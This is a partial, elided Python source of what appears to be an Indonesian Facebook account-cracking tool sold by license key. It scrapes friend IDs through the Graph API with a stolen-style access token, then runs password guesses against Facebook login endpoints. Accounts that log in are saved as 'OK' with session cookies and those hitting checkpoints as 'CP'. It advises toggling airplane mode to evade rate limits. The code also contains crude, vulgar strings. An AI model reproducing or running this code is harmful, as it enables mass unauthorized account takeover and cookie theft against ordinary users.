...
try:
    ...
    print("Sedang Install Module requests")
    os.system("python -m pip install requests &> /dev/null")
try:
    import bs4
except ModuleNotFoundError:
    print("Sedang Install Module bs4")
...
def pilih_alam():
	...
	if pil_b == "y" or pil_b == "Y":
		...
		jalan(war+"Contoh ...")
		alam = ("y")
		print(war+"jika mendapatkan OK")
		play_mpv('DING.mp3')
		time.sleep(2)
		print(war+"✓")
		print(war+"jika mendapatkan CP")
		play_mpv('bruh.mp3')
		time.sleep(2)
		print(war+"✓")
		return alam
...
logo = f"""\x1b[0;96m________________  ___________ __________©
___  ____/___   |/  /___  __ )___  ____/
__  /_    __  /|_/ / __  __  |__  /_    
_  __/    _  /  / /  _  /_/ / _  __/    
/_/       /_/  /_/   /_____/  /_/       
                                        \x1b[0;97m
\033[47m\033[1;31m Fenz O.Conner \033[41m\033[1;37m Udah Ada Pawang \x1b[0m\n"""
...
try:
	...
	print (war+'All ready to ngupdate.')
	time.sleep(1)
	ua = pilih([
...
def menu():
	...
	print(f"╰─────────╯")		
	print("╭──────────────────•")
	print("├─[%s01%s] Crack from massall"%(O,P))
...
def cpdetect():
	...
	print("\n[1] Check Opsi Dengan File (masal)")
...
def buat_angka():
	...
	print()
	jalan(war+P+"Masukan Angka Untuk Password, Dan Gunakan Koma Sebagai Pemisah"+Q)
...
class crackmenu:
    ...
    def pro_ses(self):
        ...
        print(war+"Result OK saved to : "+K+"Hasil/OK-"+durasi+".txt\n"+Q+war+"Result CP saved to : "+I+"Hasil/CP-"+durasi+".txt\n\n"+Q)

    def menu_crack(self):   # METHOD AUTO PASSWROD
        jalan("\n"+war+P+"Silahkan Pilih Metode Login !")
        jalan(war+P+"Jangan Lupa Hidup Matikan Mode Pesawat\n")
        print(Q+"[01] Methode B-Api V1 ");time.sleep(0.02)
        print(Q+"[02] Methode B-Api V2 ");time.sleep(0.02)
        print(Q+"[03] Methode B-Api V3 ");time.sleep(0.02)
        print(Q+"[04] Methode Mbasic V1 ");time.sleep(0.02)
        print(Q+"[05] Methode Mbasic V2 ");time.sleep(0.02)
        print(Q+"[06] Methode Mbasic V3 ");time.sleep(0.02)
        print(Q+"[07] Methode Mobile Pro \n");time.sleep(0.02)
    def menu_crack_m(self):   # METHOD MANUAL PASSWORD
        jalan("\n"+war+P+"Silahkan Pilih Metode Login !")
        jalan(war+P+"Silahkan Coba Satu Satu, Jangan Lupa Hidup Matikan Mode Pesawat\n")
        print(Q+"[01] Methode B-Api V1      ( Fast Crack  ) ( Rawan Spam )");time.sleep(0.02)
        print(Q+"[02] Methode B-Api V2      ( Fast Crack  ) ");time.sleep(0.02)
        print(Q+"[03] Methode Mbasic V1     ( Slow Crack  )");time.sleep(0.02)
        print(Q+"[04] Methode Mbasic V2     ( Fast Crack  )");time.sleep(0.02)
        print(Q+"[05] Methode Mobile Pro\n");time.sleep(0.02)
    ...
    def passmenu(self,isifile):
        try:
            ...
            menu()
        cjj = open(".paww", "w")
        print('\n'+war+'Silahkan Pilih Password (Default/Manual/Gabungan)\n'+war+'[d/m/g] ?')
        zk = input(inp+'Pilih : ')
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        if opsii == "y" or "y" == opsii:
                           try:
                            ...
                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q))
                    ...
                    if opsii == "y" or "y" == opsii:
                       try:
                        ...
                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q))
                        self.cp.append("%s|%s"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        break
                elif log.get("status")=="success":
                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,koki(log.get("cookies")),Q))
                ...
                if log.get("status")=="cp":
                    ...
                    if opsii == "y" or "y" == opsii:
                       try:
                        ...
                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,""),Q)
                        self.ok.append("%s|%s"%(fl.get("id"),i))
                        open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
                        break
        ...
        for pw in __yan__:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                ...
                if opsii == "y" or "y" == opsii:
                   ...
                   print('\r%s[%sCP%s]%s %s|%s%s                %s' % (Q,K,Q,K,user,pw,ttl_,Q))
                try:ttll_ = ("%s %s %s"%(day, month, year));bokep_japan_yang_terbaru("", user, pw, ttll_)
                except:bokep_japan_yang_terbaru("", user, pw, "")
...
#            po = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=0',data=dataa,allow_redirects=False)
            ...
            if 'c_user' in session.cookies.get_dict():
                ...
                ok.append(wrt)
                open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
                zczc = ('\r%s╭─[%sOK%s]%s %s • %s\n%s╰─cookie :%s %s            ' % (Q,I,Q,I,user,pw,P,I,coki))
                if infoong == "y":
    ...
    def mobile__(self, uid, listpw):
                global ok, cp, loop
                sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,self.ko,len(self.fl),len(self.ok),len(self.cp))); sys.stdout.flush()
                try:
                        for pw in listpw:
                                pw = pw.lower()
                                ses = requests.Session()
...
def dump_public():
	...
	for t in range(tanya_total):
		t +=1
		idt = input(war+"Input id or username%s : "%(t))
		idt = ubah_username_to_id(idt)
#		cek_history(idt)
		limit = ("10000")
		try:
...
#		jalan(war+"Lokasi : "+I+tinggal+Q+"\n")
		try:
			dump = open('dump/'+namafi+'.json','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5001)&access_token="+token).json()["friends"]["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
...
#	print (logo)
	...
	jalan(war+'Silahkan Chat *'+C+'Kang ProfAcc'+Q+'* Untuk Membeli Key !')
 ...
 |--100 Tahun  {C}150.000{Q} """)
	...
	tks = ("Halo Kak, Saya Pengguna Script AccVect\nSaya Mau Beli Key/License Kak\nKey/License : *"+id1+"*")
...
if "ANAK KONTOL, SAMA AJA MACAM HAKIKI" == anak_hakiki_ajg:
	if len(sys.argv) == 2:
		if sys.argv[1] == 'apk':
			...
			exit(inp+"Type : python jmbt.py (commend)")
	try:cek_tok_tok()
	except:pass
	try:menu();exit("keluar")
